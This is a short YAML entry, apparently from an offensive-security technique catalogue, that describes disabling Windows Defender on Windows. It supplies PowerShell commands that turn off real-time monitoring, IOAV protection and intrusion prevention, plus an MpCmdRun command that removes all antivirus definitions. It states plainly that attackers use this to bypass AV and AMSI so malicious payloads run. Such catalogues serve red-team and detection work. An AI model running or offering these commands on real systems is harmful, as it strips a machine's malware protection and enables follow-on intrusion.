---
description: |
  This technique disables Windows Defender’s real-time protection, removes antivirus definitions, and turns off additional security features. Attackers use this to bypass Windows Defender (AV) and AMSI protections, allowing execution of malicious payloads without interference. This command requires to be Administrator.

command: |
  Set-MPPreference -DisableRealTimeMonitoring $true

code: |
  "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All  
  Get-MPPreference  
  Set-MPPreference -DisableIOAVProtection $true  
  Set-MPPreference -DisableIntrusionPreventionSystem $true 

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - AV
references:
  - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps
  - https://superuser.com/questions/1046297/how-do-i-turn-off-windows-defender-from-the-command-line
---